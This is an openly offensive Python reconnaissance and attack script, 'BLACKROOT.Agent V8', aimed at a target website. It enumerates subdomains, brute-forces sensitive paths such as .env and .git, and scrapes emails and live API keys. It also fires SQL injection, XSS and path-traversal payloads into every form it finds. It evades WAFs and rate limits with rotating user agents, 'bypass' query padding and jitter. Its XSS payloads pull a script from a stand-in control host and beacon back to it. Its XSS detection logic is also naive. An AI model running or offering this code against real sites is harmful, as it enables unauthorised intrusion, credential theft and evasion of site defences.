import os
import requests
import random
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from bs4.element import Tag
from collections import defaultdict
import re
import socket
import threading
import json
import pickle
import dnstwist
import concurrent.futures

RECON_OUTPUT_DIR = "recon_results"

def save_recon_report(report, target):
    os.makedirs(RECON_OUTPUT_DIR, exist_ok=True)
    parsed = urlparse(target)
    base = parsed.netloc.replace(":", "_")
    for key, value in report.items():
        out_path = os.path.join(RECON_OUTPUT_DIR, f"{base}_{key}.json")
        try:
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump(value, f, indent=2)
            print(f"[💾] Saved {key} results to {out_path}")
        except Exception as e:
            print(f"[!] Could not save {key} results: {e}")

FORM_PAYLOADS = [
    ";--",
    "<script>alert(1)</script>",
    "admin'--",
    "' OR '1'='1",
    "A"*128,
    "<img src=x onerror=alert(1)>",
    "../../../../etc/passwd",
    "\" onmouseover=alert(1) x=\"",
    "<svg/onload=alert(1)>"
]

FORM_CACHE_FILE = "form_cache.pkl"

def save_form_cache(form_map):
    with open(FORM_CACHE_FILE, "wb") as f:
        pickle.dump(form_map, f)

def load_form_cache():
    if os.path.exists(FORM_CACHE_FILE):
        with open(FORM_CACHE_FILE, "rb") as f:
            return pickle.load(f)
    return {}

def harvest_and_inject_forms(endpoints, base_url=None):
    form_map = load_form_cache()
    results = {}
    for url in endpoints:
        try:
            r = requests.get(url, headers=get_random_headers(), timeout=8)
            soup = BeautifulSoup(r.text, "html.parser")
            forms = [f for f in soup.find_all("form") if isinstance(f, Tag)]
            for idx, form in enumerate(forms):
                action = str(form.get("action") or url)
                method = str(form.get("method", "get")).lower()
                fields = {}
                for inp in [i for i in form.find_all(["input", "textarea"]) if isinstance(i, Tag)]:
                    name = inp.get("name")
                    if name:
                        fields[name] = inp.get("type", "text")
                for hid in [h for h in form.find_all("input", {"type": "hidden"}) if isinstance(h, Tag)]:
                    name = hid.get("name")
                    if name:
                        fields[name] = "hidden"
                form_id = f"{url}::form{idx}"
                form_map[form_id] = {"action": action, "method": method, "fields": fields}
                inj_results = []
                for payload in FORM_PAYLOADS:
                    data = {k: payload for k in fields}
                    try:
                        target_url = urljoin(base_url or url, action)
                        if method == "post":
                            resp = requests.post(target_url, data=data, headers=get_random_headers(), timeout=8)
                        else:
                            resp = requests.get(target_url, params=data, headers=get_random_headers(), timeout=8)
                        if resp.status_code >= 400 or any(e in resp.text.lower() for e in ["error", "exception", "syntax", "fail", "traceback"]):
                            inj_results.append({"payload": payload, "status": resp.status_code, "error": True, "snippet": resp.text[:200]})
                        else:
                            inj_results.append({"payload": payload, "status": resp.status_code, "error": False})
                    except Exception as e:
                        inj_results.append({"payload": payload, "status": None, "error": True, "exception": str(e)})
                results[form_id] = inj_results
        except Exception as e:
            print(f"[!] Form harvest/inject error at {url}: {e}")
    save_form_cache(form_map)
    print(f"[✔️] Form harvester & injection simulation complete. {len(form_map)} forms mapped.")
    return results, form_map

def dnstwist_permutations(domain):
    try:
        fuzzer = dnstwist.Fuzzer(domain)
        fuzzer.generate()
        return [x['domain'] for x in fuzzer.domains]
    except Exception as e:
        print(f"[!] dnstwist error: {e}")
        return []

def fetch_crtsh_subdomains(domain):
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            subs = set()
            for entry in data:
                name = entry.get('name_value')
                if name:
                    for sub in name.split('\n'):
                        if sub.endswith(domain):
                            subs.add(sub.strip())
            return list(subs)
    except Exception as e:
        print(f"[!] crt.sh error: {e}")
    return []

def fetch_certspotter_subdomains(domain):
    url = f"https://api.certspotter.com/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            subs = set()
            for entry in data:
                for sub in entry.get('dns_names', []):
                    if sub.endswith(domain):
                        subs.add(sub.strip())
            return list(subs)
    except Exception as e:
        print(f"[!] certspotter error: {e}")
    return []

def brute_force_paths(target, wordlist=None, threads=10, filter_size=True):
    if not wordlist:
        wordlist = ["admin", "login", "dashboard", "api", "uploads", "backup", "config", ".git", ".env", "test", "dev", "staging", "private", "data", "db", "users", "register", "signup"]
    found = []
    base_len = None
    try:
        base = requests.get(target, headers=get_random_headers(), timeout=8, verify=False)
        base_len = len(base.content)
    except Exception:
        base_len = None
    def check_path(path):
        url = urljoin(target, f"/{path}")
        try:
            r = requests.get(url, headers=get_random_headers(), timeout=8, verify=False)
            if filter_size and base_len is not None and abs(len(r.content) - base_len) < 32:
                return None
            if r.status_code < 400:
                print(f"[🗂️] Found: {url} (status {r.status_code}, size {len(r.content)})")
                return url
        except Exception:
            return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        results = list(executor.map(check_path, wordlist))
    return [r for r in results if r]

def dns_zone_transfer(domain, nameserver):
    try:
        zone = []
        query = f"zone {domain}\r\n"
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((nameserver, 53))
            s.sendall(query.encode())
            while True:
                data = s.recv(1024)
                if not data:
                    break
                zone.append(data.decode())
        return zone
    except Exception as e:
        print(f"[!] DNS zone transfer error: {e}")
        return []

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "curl/7.68.0",
    "BLACKROOT.Agent-V8-Recon"
]

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS)
    }

def random_query_pad(url):
    pad = random.choice([
        f"?v={random.randint(1000,9999)}",
        f"?xss={random.randint(100,999)}",
        f"?bypass={random.randint(10000,99999)}",
        f"&v={random.randint(1000,9999)}",
        f"&xss={random.randint(100,999)}"
    ])
    if "?" in url:
        return url + pad.replace("?", "&", 1)
    else:
        return url + pad

XSS_PAYLOADS = [
    "<script src='https://your-control-node.com/veil_chrysalis.js'></script>",
    "\"'><img src=x onerror=fetch('https://your-control-node.com/log')>",
    "<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>"
]

session = requests.Session()
session.headers.update({
    "User-Agent": "BLACKROOT.Agent-V8-Recon"
})

COMMON_PATHS = [
    "/", "/login", "/admin", "/dashboard", "/js/app.js",
    "/robots.txt", "/.env", "/api", "/sitemap.xml", "/signup", "/wp-admin",
    "/.git", "/.htaccess", "/config.php", "/server-status", "/phpinfo.php"
]

def get_subdomains(domain, wordlist=None, threads=10):
    if not wordlist:
        wordlist = ["www", "mail", "dev", "test", "admin", "api", "staging", "beta", "portal", "vpn"]
    found = []
    def check(sub):
        try:
            socket.gethostbyname(f"{sub}.{domain}")
            found.append(f"{sub}.{domain}")
        except:
            pass
    threads_list = []
    for sub in wordlist:
        t = threading.Thread(target=check, args=(sub,))
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()
    return found

def parse_robots(content, base):
    paths = []
    for line in content.splitlines():
        if line.startswith("Disallow:"):
            path = line.split(":")[1].strip()
            full_url = urljoin(base, path)
            paths.append(full_url)
    return paths

def parse_sitemap(content):
    return re.findall(r'<loc>(.*?)</loc>', content)

def extract_emails(text):
    return re.findall(r'[\w\.-]+@[\w\.-]+', text)

def extract_secrets(text):
    patterns = [r'AKIA[0-9A-Z]{16}', r'sk_live_[0-9a-zA-Z]{24,}', r'AIza[0-9A-Za-z\-_]{35}']
    secrets = []
    for pat in patterns:
        secrets += re.findall(pat, text)
    return secrets

def fingerprint_tech(headers, html):
    tech = set()
    if 'x-powered-by' in headers:
        tech.add(headers['x-powered-by'])
    if 'server' in headers:
        tech.add(headers['server'])
    if 'wp-content' in html or 'wp-includes' in html:
        tech.add('WordPress')
    if 'Drupal.settings' in html:
        tech.add('Drupal')
    if 'Set-Cookie' in headers and 'PHPSESSID' in headers.get('Set-Cookie', ''):
        tech.add('PHP')
    if 'csrfmiddlewaretoken' in html:
        tech.add('Django')
    if 'laravel_session' in html:
        tech.add('Laravel')
    return list(tech)

def advanced_recon(target, max_depth=3, scope_domains=None, brute_subdomains=True):
    print(f"[🛡️] V8 ADVANCED RECON starting on: {target}")
    visited = set()
    endpoints = set()
    forms = []
    js_endpoints = set()
    emails = set()
    secrets = set()
    tech = set()
    subdomains = set()
    report = {}

    if not scope_domains:
        parsed = urlparse(target)
        scope_domains = [parsed.netloc]

    if brute_subdomains:
        print("[🔍] Enumerating subdomains...")
        for dom in scope_domains:
            found = set()
            found.update(get_subdomains(dom))
            found.update(fetch_crtsh_subdomains(dom))
            found.update(fetch_certspotter_subdomains(dom))
            found.update(dnstwist_permutations(dom))
            subdomains.update(found)
        report['subdomains'] = list(subdomains)
    print("[🗂️] Brute-forcing common directories...")
    brute_dirs = brute_force_paths(target)
    report['brute_dirs'] = brute_dirs

    def crawl(url, depth):
        if url in visited or depth > max_depth:
            return
        url_padded = random_query_pad(url)
        headers = get_random_headers()
        visited.add(url)
        backoff = 0
        try:
            start = time.time()
            r = requests.get(url_padded, headers=headers, timeout=8)
            elapsed = time.time() - start
            if r.status_code in (403, 503) or elapsed > 10:
                print(f"[🛡️] WAF anomaly: {url} status={r.status_code} delay={elapsed:.1f}s")
                backoff = random.uniform(2, 10)
            retry_after = r.headers.get('Retry-After')
            xrl_reset = r.headers.get('X-RateLimit-Reset')
            if retry_after:
                try:
                    backoff = max(backoff, float(retry_after))
                    print(f"[⏳] Rate limit detected. Backing off for {backoff:.1f}s (Retry-After)")
                except Exception:
                    pass
            elif xrl_reset:
                try:
                    reset_time = float(xrl_reset)
                    now = time.time()
                    wait = max(0, reset_time - now)
                    backoff = max(backoff, wait)
                    print(f"[⏳] Rate limit detected. Backing off for {backoff:.1f}s (X-RateLimit-Reset)")
                except Exception:
                    pass
            if backoff > 0:
                jitter = random.uniform(0.5, 2.5)
                print(f"[🧬] Injecting jitter: {jitter:.2f}s")
                time.sleep(backoff + jitter)
            soup = BeautifulSoup(r.text, "html.parser")
            html = r.text
            endpoints.add(url)
            emails.update(extract_emails(html))
            secrets.update(extract_secrets(html))
            tech.update(fingerprint_tech(r.headers, html))
            if url.endswith("robots.txt"):
                robots_paths = parse_robots(html, url)
                for p in robots_paths:
                    crawl(p, depth+1)
            if url.endswith("sitemap.xml"):
                for loc in parse_sitemap(html):
                    crawl(loc, depth+1)
            for form in soup.find_all("form"):
                if not isinstance(form, Tag):
                    continue
                action = form.get("action") or url
                method = str(form.get("method", "get")).lower()
                inputs = [inp for inp in form.find_all("input") if isinstance(inp, Tag)]
                forms.append({
                    'url': url,
                    'action': action,
                    'method': method,
                    'inputs': [inp.get('name') for inp in inputs if inp.get('name')]
                })
            for script in soup.find_all("script"):
                if isinstance(script, Tag):
                    src = script.get("src")
                    if src and isinstance(src, str) and src.startswith("http"):
                        js_endpoints.add(src)
                    if script.string:
                        found = re.findall(r'https?://[\w\./\-_%]+', script.string)
                        js_endpoints.update(found)
            for link in soup.find_all("a"):
                if not isinstance(link, Tag):
                    continue
                href = link.get("href")
                if href:
                    absolute = urljoin(url, str(href))
                    if any(domain in absolute for domain in scope_domains):
                        crawl(absolute, depth+1)
        except Exception:
            backoff = random.uniform(2, 10)
            jitter = random.uniform(0.5, 2.5)
            print(f"[⏳] Exception or timeout. Backing off for {backoff + jitter:.2f}s")
            time.sleep(backoff + jitter)

    for path in COMMON_PATHS:
        crawl(urljoin(target, path), 1)
    crawl(target, 1)

    report['endpoints'] = list(endpoints)
    report['forms'] = forms
    report['js_endpoints'] = list(js_endpoints)
    report['emails'] = list(emails)
    report['secrets'] = list(secrets)
    report['technologies'] = list(tech)
    print(f"[✔️] Recon complete. {len(endpoints)} endpoints, {len(forms)} forms, {len(js_endpoints)} JS endpoints, {len(emails)} emails, {len(secrets)} secrets found.")
    save_recon_report(report, target)
    return report

def smart_scan(target):
    results = {}
    try:
        r = session.get(target, timeout=8)
        soup = BeautifulSoup(r.text, "html.parser")
        for payload in XSS_PAYLOADS:
            if payload in r.text:
                results[target] = True
                print(f"[✔️] XSS found at {target} with payload: {payload}")
                return results
        results[target] = False
        print(f"[❌] No XSS found at {target}")
    except requests.RequestException as e:
        print(f"[!] Error scanning {target}: {e}")
        results[target] = False
    return results

def scan_for_xss(target, endpoints=None):
    results = {}
    if endpoints:
        for url in endpoints:
            results[url] = smart_scan(url)
    else:
        results[target] = smart_scan(target)
    return results

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="BLACKROOT.Agent V8 - Advanced Recon")
    parser.add_argument('--target', required=True, help='Target URL (e.g., https://victim.com)')
    parser.add_argument('--max-depth', type=int, default=3, help='Maximum crawl depth')
    parser.add_argument('--scope-domains', nargs='*', help='List of domains to scope the crawl')
    parser.add_argument('--brute-subdomains', action='store_true', help='Enable brute-force subdomain enumeration')
    args = parser.parse_args()

    report = advanced_recon(args.target, max_depth=args.max_depth, scope_domains=args.scope_domains, brute_subdomains=args.brute_subdomains)
    print(report)
    print(f"[✔️] Advanced recon report generated for {args.target}")
    print(f"Endpoints: {len(report['endpoints'])}, Forms: {len(report['forms'])}, JS Endpoints: {len(report['js_endpoints'])}, Emails: {len(report['emails'])}, Secrets: {len(report['secrets'])}, Technologies: {len(report['technologies'])}")
    print(f"Subdomains: {len(report['subdomains'])}")
    print(f"Report: {report}")
    print("[✔️] Advanced recon completed successfully.")